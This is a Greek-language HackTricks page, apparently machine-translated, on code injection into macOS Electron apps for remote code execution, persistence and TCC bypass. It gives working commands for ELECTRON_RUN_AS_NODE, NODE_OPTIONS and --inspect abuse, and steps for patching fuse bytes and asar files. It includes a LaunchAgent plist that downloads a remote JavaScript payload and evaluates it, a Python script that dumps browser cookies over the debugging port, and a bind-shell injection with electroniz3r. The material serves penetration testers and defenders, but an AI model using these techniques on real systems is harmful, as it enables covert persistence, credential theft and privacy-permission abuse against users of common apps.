# Εισαγωγή Εφαρμογών Electron σε macOS

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}

## Βασικές Πληροφορίες

Αν δεν ξέρετε τι είναι το Electron, μπορείτε να βρείτε [**πολλές πληροφορίες εδώ**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Αλλά για τώρα απλά γνωρίστε ότι το Electron εκτελεί **node**.\
Και το node έχει μερικές **παραμέτρους** και **μεταβλητές περιβάλλοντος** που μπορούν να χρησιμοποιηθούν για να **το κάνουν να εκτελέσει άλλον κώδικα** εκτός από τον καθορισμένο αρχείο.

### Συγχώνευση Electron

Αυτές οι τεχνικές θα συζητηθούν στη συνέχεια, αλλά το Electron έχει προσθέσει πρόσφατα αρκετές **σημαίες ασφαλείας για να τις αποτρέψει**. Αυτές είναι οι [**Συγχωνεύσεις Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) και αυτές είναι αυτές που χρησιμοποιούνται για να **αποτρέψουν** τις εφαρμογές Electron σε macOS από το **φόρτωμα αυθαίρετου κώδικα**:

* **`RunAsNode`**: Εάν είναι απενεργοποιημένο, αποτρέπει τη χρήση της μεταβλητής περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** για την εισαγωγή κώδικα.
* **`EnableNodeCliInspectArguments`**: Εάν είναι απενεργοποιημένο, παράμετροι όπως `--inspect`, `--inspect-brk` δεν θα τηρούνται. Αποφεύγοντας έτσι την εισαγωγή κώδικα.
* **`EnableEmbeddedAsarIntegrityValidation`**: Εάν είναι ενεργοποιημένο, το φορτωμένο **`asar`** **αρχείο** θα ελεγχθεί από το macOS. Αποτρέποντας με αυτόν τον τρόπο την **εισαγωγή κώδικα** με τροποποίηση του περιεχομένου αυτού του αρχείου.
* **`OnlyLoadAppFromAsar`**: Εάν αυτό είναι ενεργοποιημένο, αντί να αναζητά να φορτώσει με την ακόλουθη σειρά: **`app.asar`**, **`app`** και τελικά **`default_app.asar`**. Θα ελέγχει και θα χρησιμοποιεί μόνο το app.asar, εξασφαλίζοντας έτσι όταν **συνδυαστεί** με τη συγχώνευση **`embeddedAsarIntegrityValidation`** είναι **αδύνατο** να **φορτωθεί μη-επικυρωμένος κώδικας**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Εάν είναι ενεργοποιημένο, η διεργασία περιήγησης χρησιμοποιεί το αρχείο που ονομάζεται `browser_v8_context_snapshot.bin` για το στιγμιότυπο του V8.

Μια άλλη ενδιαφέρουσα συγχώνευση που δεν θα αποτρέψει την εισαγωγή κώδικα είναι:

* **EnableCookieEncryption**: Εάν είναι ενεργοποιημένο, το αποθετήριο cookie στο δίσκο κρυπτογραφείται χρησιμοποιώντας κλειδιά κρυπτογράφησης σε επίπεδο λειτουργικού συστήματος.

### Έλεγχος Συγχωνέύσεων Electron

Μπορείτε να **ελέγξετε αυτές τις σημαίες** από μια εφαρμογή με:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Τροποποίηση των Ηλεκτρονικών Ασφαλμάτων

Όπως αναφέρονται στα [**έγγραφα**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), η διαμόρφωση των **Ηλεκτρονικών Ασφαλμάτων** γίνεται μέσα στο **Ηλεκτρονικό δυαδικό** που περιέχει κάπου το συμβολοσειρά **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Στις εφαρμογές macOS αυτό βρίσκεται συνήθως στο `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Μπορείτε να φορτώσετε αυτό το αρχείο στο [https://hexed.it/](https://hexed.it/) και να αναζητήσετε την προηγούμενη συμβολοσειρά. Μετά από αυτήν τη συμβολοσειρά, μπορείτε να δείτε σε ASCII έναν αριθμό "0" ή "1" που υποδηλώνει εάν κάθε ασφάλεια είναι απενεργοποιημένη ή ενεργοποιημένη. Απλά τροποποιήστε τον κωδικό hex (`0x30` είναι `0` και `0x31` είναι `1`) για **τροποποίηση των τιμών των ασφαλειών**.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Σημείωση ότι αν προσπαθήσετε να **αντικαταστήσετε** το **δυαδικό αρχείο του Electron Framework** μέσα σε μια εφαρμογή με αυτά τα bytes τροποποιημένα, η εφαρμογή δεν θα εκκινήσει.

## RCE προσθέτοντας κώδικα σε Εφαρμογές Electron

Μπορεί να υπάρχουν **εξωτερικά αρχεία JS/HTML** που χρησιμοποιεί μια Εφαρμογή Electron, έτσι ένας επιτιθέμενος μπορεί να ενθέσει κώδικα σε αυτά τα αρχεία, η υπογραφή των οποίων δεν θα ελεγχθεί και να εκτελέσει αυθαίρετο κώδικα στο πλαίσιο της εφαρμογής.

{% hint style="danger" %}
Ωστόσο, προς το παρόν υπάρχουν 2 περιορισμοί:

* Η άδεια **`kTCCServiceSystemPolicyAppBundles`** είναι **απαραίτητη** για την τροποποίηση μιας Εφαρμογής, οπότε από προεπιλογή αυτό δεν είναι πλέον δυνατό.
* Το μεταγλωττισμένο αρχείο **`asap`** συνήθως έχει τις ασφάλειες **`embeddedAsarIntegrityValidation`** `και` **`onlyLoadAppFromAsar`** `ενεργοποιημένες`

Κάνοντας αυτό το μονοπάτι επίθεσης πιο περίπλοκο (ή αδύνατο).
{% endhint %}

Σημειώστε ότι είναι δυνατό να παρακάμψετε την απαίτηση της **`kTCCServiceSystemPolicyAppBundles`** με το να αντιγράψετε την εφαρμογή σε έναν άλλο κατάλογο (όπως **`/tmp`**), να μετονομάσετε τον φάκελο **`app.app/Contents`** σε **`app.app/NotCon`**, **τροποποιήστε** το αρχείο **asar** με τον **κακόβουλο** κώδικά σας, να το μετονομάσετε πίσω σε **`app.app/Contents`** και να το εκτελέσετε.

Μπορείτε να αποσυμπιέσετε τον κώδικα από το αρχείο asar με:
```bash
npx asar extract app.asar app-decomp
```
Και συμπιέστε το πίσω μετά την τροποποίησή του με:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE με το `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Σύμφωνα με [**τα έγγραφα**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), εάν αυτή η μεταβλητή περιβάλλοντος είναι ορισμένη, θα ξεκινήσει τη διαδικασία ως ένα κανονικό διεργασία Node.js.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Αν η προστασία **`RunAsNode`** είναι απενεργοποιημένη, η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** θα αγνοηθεί και αυτό δεν θα λειτουργήσει.
{% endhint %}

### Έγχυση από το Plist της Εφαρμογής

Όπως [**προτάθηκε εδώ**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), μπορείτε να καταχραστείτε αυτήν τη μεταβλητή περιβάλλοντος σε ένα plist για να διατηρήσετε την επιμονή:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE με `NODE_OPTIONS`

Μπορείτε να αποθηκεύσετε το φορτίο σε διαφορετικό αρχείο και να το εκτελέσετε:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Αν η ασφάλεια **`EnableNodeOptionsEnvironmentVariable`** είναι **απενεργοποιημένη**, η εφαρμογή θα **αγνοήσει** τη μεταβλητή περιβάλλοντος **NODE\_OPTIONS** όταν εκκινηθεί εκτός αν η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** είναι ορισμένη, η οποία θα **αγνοηθεί** επίσης αν η ασφάλεια **`RunAsNode`** είναι απενεργοποιημένη.

Αν δεν ορίσετε το **`ELECTRON_RUN_AS_NODE`**, θα εμφανιστεί το **σφάλμα**: `Οι περισσότερες NODE_OPTIONs δεν υποστηρίζονται σε συσκευασμένες εφαρμογές. Δείτε την τεκμηρίωση για περισσότερες λεπτομέρειες.`
{% endhint %}

### Έγχυση από το Plist της Εφαρμογής
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE με επιθετική επιθεύση

Σύμφωνα με [**αυτό**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), εάν εκτελέσετε μια εφαρμογή Electron με σημαίες όπως **`--inspect`**, **`--inspect-brk`** και **`--remote-debugging-port`**, ένα **θύρα εντοπισμού σφαλμάτων θα είναι ανοιχτή** ώστε να μπορείτε να συνδεθείτε σε αυτήν (για παράδειγμα από το Chrome στο `chrome://inspect`) και θα μπορείτε να **εισάγετε κώδικα σε αυτήν** ή ακόμη και να εκκινήσετε νέες διεργασίες.\
Για παράδειγμα:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Εάν το ασφαλιστικό **`EnableNodeCliInspectArguments`** είναι απενεργοποιημένο, η εφαρμογή θα **αγνοήσει τις παραμέτρους του node** (όπως `--inspect`) όταν ξεκινήσει εκτός αν η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** είναι ορισμένη, η οποία θα **αγνοηθεί** επίσης εάν το ασφαλιστικό **`RunAsNode`** είναι απενεργοποιημένο.

Ωστόσο, μπορείτε ακόμα να χρησιμοποιήσετε την παράμετρο **electron `--remote-debugging-port=9229`** αλλά το προηγούμενο φορτίο δεν θα λειτουργήσει για την εκτέλεση άλλων διεργασιών.
{% endhint %}

Χρησιμοποιώντας την παράμετρο **`--remote-debugging-port=9222`** είναι δυνατόν να κλέψετε κάποιες πληροφορίες από την εφαρμογή Electron όπως το **ιστορικό** (με GET εντολές) ή τα **cookies** του προγράμματος περιήγησης (καθώς αποκρυπτογραφούνται μέσα στον περιηγητή και υπάρχει ένα **json endpoint** που θα τα δώσει).

Μπορείτε να μάθετε πώς να το κάνετε αυτό σε [**εδώ**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) και [**εδώ**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) και να χρησιμοποιήσετε το αυτόματο εργαλείο [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ή ένα απλό σενάριο όπως:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
Στο [**συγκεκριμένο blogpost**](https://hackerone.com/reports/1274695), αυτή η αποσφαλμάτωση καταχρηστεύεται για να κάνει το headless chrome **να κατεβάσει αυθαίρετα αρχεία σε αυθαίρετες τοποθεσίες**.

### Έγχυση από το App Plist

Μπορείτε να καταχρηστεύσετε αυτήν τη μεταβλητή περιβάλλοντος σε ένα plist για να διατηρήσετε την επιμονή προσθέτοντας αυτά τα κλειδιά:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Παράκαμψη TCC εκμεταλλευόμενος Παλαιότερες Εκδόσεις

{% hint style="success" %}
Το TCC daemon του macOS δεν ελέγχει την εκτελούμενη έκδοση της εφαρμογής. Έτσι, αν **δεν μπορείτε να ενθάρρυνετε κώδικα σε μια εφαρμογή Electron** με καμία από τις προηγούμενες τεχνικές, μπορείτε να κατεβάσετε μια προηγούμενη έκδοση της ΕΦΑΡΜΟΓΗΣ και να ενθάρρυνετε κώδικα σε αυτήν καθώς θα εξακολουθεί να λαμβάνει τα δικαιώματα TCC (εκτός αν το Trust Cache το εμποδίζει).
{% endhint %}

## Εκτέλεση μη JS Κώδικα

Οι προηγούμενες τεχνικές θα σας επιτρέψουν να εκτελέσετε **JS κώδικα μέσα στη διαδικασία της εφαρμογής electron**. Ωστόσο, θυμηθείτε ότι οι **υποδιεργασίες εκτελούνται υπό το ίδιο προφίλ αμμοθοχώρου** με τη γονική εφαρμογή και **κληρονομούν τα δικαιώματα TCC** τους.\
Επομένως, αν θέλετε να εκμεταλλευτείτε τις αδειοδοτήσεις για πρόσβαση στην κάμερα ή το μικρόφωνο για παράδειγμα, απλά μπορείτε να **εκτελέσετε ένα άλλο δυαδικό από τη διαδικασία**.

## Αυτόματη Ενθάρρυνση

Το εργαλείο [**electroniz3r**](https://github.com/r3ggi/electroniz3r) μπορεί να χρησιμοποιηθεί εύκολα για να **εντοπίσει ευάλωτες εφαρμογές electron** που έχουν εγκατασταθεί και να ενθαρρύνει κώδικα σε αυτές. Αυτό το εργαλείο θα προσπαθήσει να χρησιμοποιήσει την τεχνική **`--inspect`**:

Πρέπει να το μεταγλωτίσετε μόνοι σας και μπορείτε να το χρησιμοποιήσετε ως εξής:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Αναφορές

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
